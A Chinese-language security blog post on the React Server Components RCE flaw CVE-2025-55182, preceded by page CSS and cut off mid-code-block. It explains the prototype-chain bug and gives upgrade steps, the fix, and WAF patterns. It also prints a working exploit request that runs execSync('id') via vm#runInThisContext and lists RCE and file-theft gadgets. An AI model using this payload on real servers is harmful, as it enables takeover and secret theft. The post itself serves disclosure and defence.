h1:before{content:"";width:50px;height:42px;display:block;position:absolute;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAhBAMAAACo1K8bAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAnUExURUdwTMyhUsqkUMyhUsyiUcyhUsyhUsyhUcyhUsyhUs2hUtytWNWoVX44si8AAAAKdFJOUwD8Bfcge95QncCWSSDAAAABh0lEQVQoz2WSPUvDQBjHjyPSOB7drh2OUOs36NA6pKAFwaEo4tDFIUWxGYLgKw4BEYUuHaQg7XJ0kccsUmrT2qUUQZp8KO/y1hSfIYEf/5eHu0MoGU1+sIbSw5Bypd92S+dWWrd34b15vuOPY4QxuvtYZp0lIVk3Zgjt+5zkh12AvBHnbW85BOjXySPwhc5CYcY0OdDh5dEUqIEj4cN8Dty3a1MqYJS4MaWU5wzVLwMMxqGSNQgA/VFa4gf50yhxSUW+db8ACa2gBxfnABVDFYHCPYrc7TLwCepJM8/ZoVsRwpxdHEozHUXd6idwVzFFM5BFmIhQVQjrNdnCvdd48wblI2VHtsAZioSsTYVwLoXvjMXH1icuNgPhQE+Ot1+xi8HeA3d1Df1f1JPVUOmsYLujBjuSySqSXYt+yTwbJ0pcyIhqTrxkn0BazRLizJosxRBued+z0jPD6VewOXl5utHRGmMNK3k0iTkzxpq2/oIQO6gLprF12kT/R20eyzlcg7iwK0dPsz/ibpdsCHweWwAAAABJRU5ErkJggg==) 0 0 no-repeat;background-size:80%;bottom:-10px;left:-2px}.markdown-body h2{font-size:24px}.markdown-body h2:before{content:"";width:50px;height:42px;display:block;position:absolute;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAhBAMAAACo1K8bAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAnUExURUdwTMyhUsqkUMyhUsyiUcyhUsyhUsyhUcyhUsyhUs2hUtytWNWoVX44si8AAAAKdFJOUwD8Bfcge95QncCWSSDAAAABh0lEQVQoz2WSPUvDQBjHjyPSOB7drh2OUOs36NA6pKAFwaEo4tDFIUWxGYLgKw4BEYUuHaQg7XJ0kccsUmrT2qUUQZp8KO/y1hSfIYEf/5eHu0MoGU1+sIbSw5Bypd92S+dWWrd34b15vuOPY4QxuvtYZp0lIVk3Zgjt+5zkh12AvBHnbW85BOjXySPwhc5CYcY0OdDh5dEUqIEj4cN8Dty3a1MqYJS4MaWU5wzVLwMMxqGSNQgA/VFa4gf50yhxSUW+db8ACa2gBxfnABVDFYHCPYrc7TLwCepJM8/ZoVsRwpxdHEozHUXd6idwVzFFM5BFmIhQVQjrNdnCvdd48wblI2VHtsAZioSsTYVwLoXvjMXH1icuNgPhQE+Ot1+xi8HeA3d1Df1f1JPVUOmsYLujBjuSySqSXYt+yTwbJ0pcyIhqTrxkn0BazRLizJosxRBued+z0jPD6VewOXl5utHRGmMNK3k0iTkzxpq2/oIQO6gLprF12kT/R20eyzlcg7iwK0dPsz/ibpdsCHweWwAAAABJRU5ErkJggg==) 0 0 no-repeat;background-size:70%;bottom:-15px;left:-1px}.markdown-body h3{font-size:18px}.markdown-body h3:before{content:"";width:50px;height:42px;display:block;position:absolute;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAhBAMAAACo1K8bAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAnUExURUdwTMyhUsqkUMyhUsyiUcyhUsyhUsyhUcyhUsyhUs2hUtytWNWoVX44si8AAAAKdFJOUwD8Bfcge95QncCWSSDAAAABh0lEQVQoz2WSPUvDQBjHjyPSOB7drh2OUOs36NA6pKAFwaEo4tDFIUWxGYLgKw4BEYUuHaQg7XJ0kccsUmrT2qUUQZp8KO/y1hSfIYEf/5eHu0MoGU1+sIbSw5Bypd92S+dWWrd34b15vuOPY4QxuvtYZp0lIVk3Zgjt+5zkh12AvBHnbW85BOjXySPwhc5CYcY0OdDh5dEUqIEj4cN8Dty3a1MqYJS4MaWU5wzVLwMMxqGSNQgA/VFa4gf50yhxSUW+db8ACa2gBxfnABVDFYHCPYrc7TLwCepJM8/ZoVsRwpxdHEozHUXd6idwVzFFM5BFmIhQVQjrNdnCvdd48wblI2VHtsAZioSsTYVwLoXvjMXH1icuNgPhQE+Ot1+xi8HeA3d1Df1f1JPVUOmsYLujBjuSySqSXYt+yTwbJ0pcyIhqTrxkn0BazRLizJosxRBued+z0jPD6VewOXl5utHRGmMNK3k0iTkzxpq2/oIQO6gLprF12kT/R20eyzlcg7iwK0dPsz/ibpdsCHweWwAAAABJRU5ErkJggg==) 0 0 no-repeat;background-size:60%;bottom:-19px;left:-2px}.markdown-body h4{font-size:16px;padding-left:0;border-bottom:1px solid rgba(209,163,78,.6)}.markdown-body h5{font-size:15px;padding-left:0}.markdown-body em{color:#cca152}.markdown-body del{text-decoration-color:#cca152;text-decoration-thickness:2px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:80%;margin:6px auto;box-shadow:0 6px 15px #8e8e8e;display:block;margin:20px auto!important;object-fit:contain;border-radius:8px}.markdown-body hr{border:none;border-top:2px solid #e0c9a1;margin-top:32px 0}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background:#f6efde;color:#b69454;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Mono,Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;background:#fef6e1;border-radius:4px;box-shadow:0 0 8px hsla(0,0%,47%,.45)}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAOCAMAAABaWb9VAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFZaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA1LjQuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkzCJ1kAAAAJcEhZcwAADsQAAA7EAZUrDhsAAACHUExURUdwTMxCKdc8NvdYT/9hVyLJPABBAGubKNiIOv+/K+ytJBakH9aZG+5QR5VZDOBDPhmtJ8+VGuGjH/CwJR26MR6+NBq0LPW1KBmwKetNRfJUTONHP92fHuSmIeFEPhu3LR29M/BTS+mqIuqsI5qdHyLKPP++Kv9gVf9lW//KLSXXQCTQP//FLMVm5KQAAAAldFJOUwAlPPz7+woBBPu8Mzu+FlRRKmvnweeG+Wqg6mVNXmuc1OCbmjZJWF/9AAABKklEQVQoz3WS6XaCMBCFRzAM++KGsqhtDwES3//5OtmA2uP9A9zwzRoAgBC0QgQrdA68OZsDr229YGHoIEj7Pl0ZOgjKa5lYJ4Rd1vijn3nuD4Qurjmv48o6RFyfbGDnS6DeEXZfk5ZfuBhdPb9I87ECNMh1EFJKIU6agWzaa01NbmLkxznSmmObJBkkUxrERf3i+ftRiZi7ShPCYY64UhTx1AR5CDYoMXkOKEY7GmTcTzeD/FiER68DfSLgSRqEIBoB3P8h3x8RZhBXGJGusJdD6rfCBl0YqvZNkrV9zej2cWlfJWG6fRpyM41qYH+GTPPi2yFLQYC0Qybm5o96lW77kMbcrBKtgeWTsthVamNXFF4I6x0DTPuugsVRFyYpyxzWqNvHJwed8ws7QyP1UwjNjwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fef6e1}.markdown-body a{text-decoration:none;color:#d8ac5a;border-bottom:1px solid #d8ac5a}.markdown-body a:active,.markdown-body a:hover{color:#93753f;border-color:#93753f}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f4e8c7;border-collapse:collapse}.markdown-body thead{background:rgba(255,227,176,.6588235294);text-align:left;display:table-header-group;border-bottom:1px solid rgba(255,227,176,.6588235294)}.markdown-body tbody{background:rgba(255,247,229,.3882352941)}.markdown-body td,.markdown-body th{padding:7px;line-height:24px;min-width:100px}.markdown-body blockquote{color:#bd954f;padding:1px 23px;margin:22px 0;border-left:4px solid #dcb267;background-color:#fff7e5}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol .task-list-item,.markdown-body ul .task-list-item{list-style:none}.markdown-body ol li{padding-left:6px}.markdown-body::marker{color:#dcb267}.markdown-body .contains-task-list{padding-left:0}.markdown-body .contains-task-list .task-list-item{list-style:none;position:relative}.markdown-body .contains-task-list .task-list-item input[type=checkbox]{position:relative;top:2px}.markdown-body .contains-task-list .task-list-item input[type=checkbox]:before{content:"";display:inline-block;height:12px;width:12px;position:absolute;left:-2px;top:-2px;border:2px solid #cda152;border-radius:5px}.markdown-body .contains-task-list .task-list-item input[type=checkbox]:checked{position:relative;top:2px}.markdown-body .contains-task-list .task-list-item input[type=checkbox]:checked:before{border:none;content:"";display:inline-block;height:17px;width:17px;position:absolute;left:-2px;top:-2px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAFo9M/3AAAAAXNSR0IArs4c6QAAAYhJREFUOBFjYACC0/MDGsDEiyvr/zOCeUwMJxn/A8HZRUEMYBFGJsZ6kFoQYALiAyAGCgDpA+sFijKeWRj4H1kWpIWBW1SDQcm+BCzOAiK/vr7BcO/gDbAAI4hE1waWgRBnmWCGIwkyKFjnwow0BhsJk9QLncvw5dV1oPE9MCEGmBWrgCKhcFEowyR+PSNYwemFAZ4M/xjMkRWYJm5oAPFB/joDpI1BHHQANgGPDxj+//vfCA4IdJ3GcevgQnAFhlHLwYIgSVA0wABcwY3tFQzokiBFGIEP0wmigW5wZAK5FFkQib0a6NUDcEmgb7AGFpIGZOZqoMFhIAFQknEAJpn9yLLEssFOBCp2IFaDkl0xg6C8FbJyB3gowUS5RdQYBORQYpVB1iwVHIIMwJh///AYTCmYRklNIBFmNi4GeYt0BhnjeIa3dw8wSBlEgDUhxw2yCRgGfHp2geHiqiSwUwUVrFAiFVkjjA1LrjgTHEwhFvosMCZM4NEIUoAtWWNoBGZ70/gN22HiAD2uhAzsYNBZAAAAAElFTkSuQmCC) 0 0 no-repeat;background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>⚠️ 严重警告</strong>：如果你在使用 React Server Components，请立即检查并升级到安全版本！</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bcf52194d76490fbcde5b9cce9415cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGltZXdlYXZlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765432696&amp;x-signature=WeBCXMmK%2F18MhKEozzY1BWOSIes%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">📌 漏洞速览</h2>
<ul>
<li><strong>CVE编号</strong>：CVE-2025-55182</li>
<li><strong>严重程度</strong>：CVSS 10.0（最高级别）</li>
<li><strong>漏洞类型</strong>：未授权远程代码执行（RCE）</li>
<li><strong>影响范围</strong>：React 19.0.0, 19.1.0, 19.1.1, 19.2.0</li>
<li><strong>修复版本</strong>：19.0.1, 19.1.2, 19.2.1</li>
</ul>
<p>2025年12月3日，React 团队紧急发布安全公告，披露了一个影响 React Server Components 的严重安全漏洞。攻击者可以在<strong>无需身份验证</strong>的情况下，通过精心构造的 HTTP 请求实现<strong>远程代码执行</strong>，完全控制服务器。</p>
<h2 data-id="heading-1">🎯 谁受影响？</h2>
<p>如果你在使用以下任一技术栈，<strong>请立即检查</strong>：</p>
<ul>
<li>✅ <strong>Next.js</strong>（所有使用 React Server Components 的版本）</li>
<li>✅ <strong>React Router</strong>（使用 RSC API）</li>
<li>✅ <strong>Waku</strong></li>
<li>✅ <strong>Expo</strong>（使用 Server Components）</li>
<li>✅ <strong>Redwood SDK</strong></li>
<li>✅ <strong>@vitejs/plugin-rsc</strong></li>
<li>✅ 任何直接使用 <code>react-server-dom-webpack</code>、<code>react-server-dom-parcel</code> 或 <code>react-server-dom-turbopack</code> 的项目</li>
</ul>
<p><strong>重要提示</strong>：即使你的应用没有实现任何 React Server Function 端点，只要支持 React Server Components，就可能存在风险！</p>
<h2 data-id="heading-2">🔍 漏洞原理深度解析</h2>
<h3 data-id="heading-3">核心问题：原型链污染</h3>
<p>这个漏洞的根本原因在于 React 在处理 Server Function 请求时，使用了<strong>不安全的属性访问方式</strong>。</p>
<h4 data-id="heading-4">漏洞代码位置</h4>
<p>漏洞位于 <code>react-server-dom-webpack</code> 包的 <code>requireModule</code> 函数中：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 漏洞代码（React 19.0.0）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">requireModule</span>(<span class="hljs-params">metadata</span>) {
  <span class="hljs-keyword">var</span> moduleExports = <span class="hljs-title function_">__webpack_require__</span>(metadata[<span class="hljs-number">0</span>]);
  <span class="hljs-comment">// ... 省略其他代码 ...</span>
  <span class="hljs-keyword">return</span> moduleExports[metadata[<span class="hljs-number">2</span>]];  <span class="hljs-comment">// ⚠️ 危险：访问了原型链！</span>
}
</code></pre>
<h4 data-id="heading-5">问题分析</h4>
<p>在 JavaScript 中，使用方括号 <code>obj[key]</code> 访问属性时，会<strong>遍历整个原型链</strong>。这意味着：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
fs[<span class="hljs-string">'readFileSync'</span>]  <span class="hljs-comment">// ✅ 正常：访问自己的属性</span>
fs[<span class="hljs-string">'constructor'</span>]   <span class="hljs-comment">// ⚠️ 危险：访问到 Object.prototype.constructor</span>
fs[<span class="hljs-string">'__proto__'</span>]    <span class="hljs-comment">// ⚠️ 危险：访问到 Object.prototype</span>
</code></pre>
<p>攻击者可以利用这个特性，通过 <code>#constructor</code>、<code>#__proto__</code> 等特殊属性名，访问到模块导出对象的原型链属性。</p>
<h3 data-id="heading-6">攻击流程</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/225c914de5b140748efd6428c65df454~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGltZXdlYXZlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765432696&amp;x-signature=Kio87oWlY7Z7F1z%2F09792zBzo7o%3D" alt="image.png" loading="lazy"/>
完整的攻击流程如下：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. 攻击者发送恶意 HTTP POST 请求
   ↓
<span class="hljs-number">2</span>. 请求包含 $ACTION_REF_0 和 $ACTION_0:<span class="hljs-number">0</span> 字段
   ↓
<span class="hljs-number">3</span>. <span class="hljs-built_in">decodeAction</span>() 解析请求
   ↓
<span class="hljs-number">4</span>. <span class="hljs-built_in">resolveServerReference</span>() 解析模块ID（如 <span class="hljs-string">"vm#runInThisContext"</span>）
   ↓
<span class="hljs-number">5</span>. <span class="hljs-built_in">requireModule</span>() 加载模块并访问导出
   ↓
<span class="hljs-number">6</span>. moduleExports[metadata[<span class="hljs-number">2</span>]] 访问原型链 ⚠️
   ↓
<span class="hljs-number">7</span>. 返回危险函数（如 vm.runInThisContext）
   ↓
<span class="hljs-number">8</span>. 函数被调用，执行攻击者代码 💥
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8102d3eb0ad34904ab10f43979ed53e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGltZXdlYXZlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765432696&amp;x-signature=dMnx%2BMeZ3IOctYer3psKADL39W4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">实际攻击示例</h3>
<p>攻击者可以构造如下请求：</p>
<pre><code class="hljs language-http" lang="http">POST /formaction HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="$ACTION_REF_0"

------Boundary
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"vm#runInThisContext","bound":["process.mainModule.require('child_process').execSync('id').toString()"]}
------Boundary--
</code></pre>
<p>这个请求会：</p>
<ol>
<li>加载 <code>vm</code> 模块</li>
<li>访问 <code>vm.runInThisContext</code> 方法</li>
<li>将攻击者的代码作为参数绑定</li>
<li>执行时运行 <code>execSync('id')</code>，实现命令执行</li>
</ol>
<h2 data-id="heading-8">💣 攻击向量（RCE Gadgets）</h2>
<p>根据安全研究，以下 Node.js 模块如果存在于 webpack bundle 中，都可以被利用：</p>
<h3 data-id="heading-9">直接 RCE 向量</h3>



































<table><thead><tr><th>模块</th><th>方法</th><th>攻击效果</th></tr></thead><tbody><tr><td><code>vm</code></td><td><code>runInThisContext</code></td><td>在当前上下文执行任意 JavaScript</td></tr><tr><td><code>vm</code></td><td><code>runInNewContext</code></td><td>在新上下文执行（可逃逸沙箱）</td></tr><tr><td><code>child_process</code></td><td><code>execSync</code></td><td>直接执行 shell 命令</td></tr><tr><td><code>child_process</code></td><td><code>execFileSync</code></td><td>执行二进制文件</td></tr><tr><td><code>child_process</code></td><td><code>spawnSync</code></td><td>创建新进程</td></tr></tbody></table>
<h3 data-id="heading-10">文件操作向量</h3>




















<table><thead><tr><th>模块</th><th>方法</th><th>攻击效果</th></tr></thead><tbody><tr><td><code>fs</code></td><td><code>readFileSync</code></td><td>读取任意文件（如 <code>.env</code>、私钥）</td></tr><tr><td><code>fs</code></td><td><code>writeFileSync</code></td><td>写入任意文件（持久化后门）</td></tr></tbody></table>
<h3 data-id="heading-11">真实场景中的风险</h3>
<p>这些危险模块在真实项目中非常常见：</p>
<ul>
<li><strong><code>fs</code></strong>：几乎所有 Node.js 应用都会使用（145M+ 周下载量）
<ul>
<li>常见包：<code>fs-extra</code>、<code>gray-matter</code>、<code>multer</code>、<code>sharp</code></li>
</ul>
</li>
<li><strong><code>child_process</code></strong>：构建工具、PDF 生成、图像处理常用（103M+ 周下载量）
<ul>
<li>常见包：<code>execa</code>、<code>shelljs</code>、<code>puppeteer</code>、<code>sharp</code></li>
</ul>
</li>
<li><strong><code>vm</code></strong>：模板引擎、测试框架使用（21M+ 周下载量）
<ul>
<li>常见包：<code>ejs</code>、<code>pug</code>、<code>handlebars</code>、<code>vm2</code></li>
</ul>
</li>
</ul>
<p><strong>这意味着大多数使用 React Server Components 的应用都可能存在可被利用的危险模块！</strong></p>
<h2 data-id="heading-12">🛡️ 修复方案</h2>
<h3 data-id="heading-13">立即升级</h3>
<p>React 团队已经在以下版本中修复了漏洞：</p>
<ul>
<li><code>react-server-dom-webpack</code>: &gt;= 19.0.1, &gt;= 19.1.2, &gt;= 19.2.1</li>
<li><code>react-server-dom-parcel</code>: &gt;= 19.0.1, &gt;= 19.1.2, &gt;= 19.2.1</li>
<li><code>react-server-dom-turbopack</code>: &gt;= 19.0.1, &gt;= 19.1.2, &gt;= 19.2.1</li>
</ul>
<h3 data-id="heading-14">修复代码</h3>
<p>修复后的代码使用了 <code>hasOwnProperty</code> 检查，确保只访问对象自身的属性：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 修复后的代码（React 19.2.1+）</span>
<span class="hljs-keyword">if</span> (hasOwnProperty.<span class="hljs-title function_">call</span>(moduleExports, metadata[<span class="hljs-number">2</span>]))
  <span class="hljs-keyword">return</span> moduleExports[metadata[<span class="hljs-number">2</span>]];
</code></pre>
<h3 data-id="heading-15">框架特定升级指南</h3>
<h4 data-id="heading-16">Next.js</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 根据你的 Next.js 版本选择对应的修复版本</span>
npm install next@15.0.5   <span class="hljs-comment"># for 15.0.x</span>
npm install next@15.1.9   <span class="hljs-comment"># for 15.1.x</span>
npm install next@15.2.6   <span class="hljs-comment"># for 15.2.x</span>
npm install next@15.3.6   <span class="hljs-comment"># for 15.3.x</span>
npm install next@15.4.8   <span class="hljs-comment"># for 15.4.x</span>
npm install next@15.5.7   <span class="hljs-comment"># for 15.5.x</span>
npm install next@16.0.7   <span class="hljs-comment"># for 16.0.x</span>
</code></pre>
<h4 data-id="heading-17">React Router</h4>
<pre><code class="hljs language-bash" lang="bash">npm install react@latest
npm install react-dom@latest
npm install react-server-dom-parcel@latest
npm install react-server-dom-webpack@latest
npm install @vitejs/plugin-rsc@latest
</code></pre>
<h4 data-id="heading-18">其他框架</h4>
<ul>
<li><strong>Expo</strong>: <code>npm install react@latest react-dom@latest react-server-dom-webpack@latest</code></li>
<li><strong>Waku</strong>: <code>npm install react@latest react-dom@latest react-server-dom-webpack@latest waku@latest</code></li>
<li><strong>Redwood SDK</strong>: 确保 <code>rwsdk&gt;=1.0.0-alpha.0</code>，然后升级 React 相关包</li>
</ul>
<h2 data-id="heading-19">🔒 额外防护措施</h2>
<h3 data-id="heading-20">1. 依赖审计</h3>
<p>检查你的项目是否包含危险模块：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查是否包含危险模块</span>
npm list | grep -E <span class="hljs-string">"(vm|child_process|fs)"</span>
</code></pre>
<h3 data-id="heading-21">2. Next.js 配置优化</h3>
<p>在 <code>next.config.js</code> 中排除危险包，防止它们被打包：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">serverExternalPackages</span>: [
    <span class="hljs-string">'sharp'</span>,
    <span class="hljs-string">'puppeteer'</span>,
    <span class="hljs-string">'execa'</span>,
    <span class="hljs-string">'shelljs'</span>
  ]
}
</code></pre>
<h3 data-id="heading-22">3. WAF 规则</h3>
<p>如果你的应用部署在支持 WAF 的环境，可以添加以下规则拦截可疑请求：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 拦截包含危险模式的请求</span>
<span class="hljs-variable">$ACTION_</span>*<span class="hljs-comment">#constructor</span>
<span class="hljs-variable">$ACTION_</span>*<span class="hljs-comment">#__proto__</span>
<span class="hljs-variable">$ACTION_</span>*<span class="hljs-comment">#prototype</span>
vm<span class="hljs-comment">#runInThisContext</span>
child_process<span class="hljs-comment">#execSync</span>
fs<span class="hljs-comment">#writeFileSync</span>
</code></pre>
<h3 data-id="heading-23">4. 监控和告警</h3>
<p>监控日志中的异常模式：</p>
<ul>
<li>包含 <code>#constructor</code>、<code>#__proto__</code> 的 Server Action 请求</li>
<li>对 <code>vm</code>、<code>child_process</code> 等模块的异常访问</li>
<li>异常的 Server Function 调用</li>
</ul>
<h2 data-id="heading-24">📊 漏洞时间线</h2>
<ul>
<li><strong>2025年11月29日</strong>：Lachlan Davidson 通过 Meta Bug Bounty 报告漏洞</li>
<li><strong>2025年11月30日</strong>：Meta 安全团队确认并开始修复</li>
<li><strong>2025年12月1日</strong>：修复完成，开始与托管提供商和开源项目协调</li>
<li><strong>2025年12月3日</strong>：修复发布到 npm，公开披露为 CVE-2025-55182</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e62e2cea43894af68cb64eb35fc651ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGltZXdlYXZlcg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765432696&amp;x-signature=cBWEz37AHO636R0z8QSJFbUCKuE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-25">🎓 技术启示</h2>
<p>这个漏洞给我们几个重要的安全启示：</p>
<h3 data-id="heading-26">1. 原型链访问的风险</h3>
<p>在 JavaScript 中，使用方括号访问属性时，<strong>永远要考虑原型链</strong>。对于用户可控的属性名，必须使用 <code>hasOwnProperty</code> 或 <code>Object.prototype.hasOwnProperty.call()</code> 进行检查。</p>
<h3 data-id="heading-27">2. 反序列化的危险性</h3>
<p>任何涉及反序列化用户输入的地方都是高风险区域。React Server Components 的 Flight 协议本质上就是一种序列化/反序列化机制，需要严格验证。</p>
<h3 data-id="heading-28">3. 最小权限原则</h3>
<p>即使修复了漏洞，也应该尽量减少服务器端 bundle 中包含的危险模块。只打包真正需要的代码。</p>
<h3 data-id="heading-29">4. 深度防御</h3>
<p>Next.js 等框架在 React 底层之上添加了额外的验证层，这种深度防御策略在关键时刻起到了保护作用。</p>
<h2 data-id="heading-30">🔬 技术细节（进阶）</h2>
<h3 data-id="heading-31">为什么 Function 构造函数不够？</h3>
<p>你可能会想：既然可以访问 <code>constructor</code>，为什么不直接用 <code>Function</code> 构造函数执行代码？</p>
<p>问题在于，<code>Function.bind(null, 'code')()</code> 只会<strong>创建一个函数</strong>，而不会执行它：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">'return 1+1'</span>)()  
